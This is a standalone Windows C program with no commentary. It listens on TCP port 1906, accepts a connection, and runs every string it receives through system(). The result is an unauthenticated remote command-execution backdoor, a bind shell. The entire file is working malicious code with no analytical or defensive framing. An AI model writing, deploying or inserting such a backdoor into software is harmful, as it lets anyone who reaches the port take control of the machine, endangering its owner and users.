#include <windows.h>
#include <string.h>
#pragma comment(lib, "Ws2_32.lib")

int main() {
	SOCKET Socket;
	WSADATA wsaData;
	SOCKET BindSocket;
	SOCKET TempSocket = INVALID_SOCKET;
	SOCKADDR_IN SockAddr;
	int Result = SOCKET_ERROR, nRet;

	nRet = WSAStartup(MAKEWORD(1, 1), &wsaData);
	if (nRet != 0) return 0;
	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (Socket == INVALID_SOCKET) return 0;
	SockAddr.sin_port = htons(1906);
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = INADDR_ANY;
	BindSocket = bind(Socket, (SOCKADDR *)(&SockAddr), sizeof(SockAddr));
	if (BindSocket == SOCKET_ERROR) return 0;
	listen(Socket, 1);

	while (TempSocket == INVALID_SOCKET) {
		TempSocket = accept(Socket, NULL, NULL);
	}
	Socket = TempSocket;
	while (1) {
		Sleep(2);
		char Cmd[MAX_PATH] = "";
		Result = recv(Socket, Cmd, sizeof(Cmd), 0);
		if (Result > 0) system(Cmd);
	}
	closesocket(Socket);
	WSACleanup();
	return 0;
}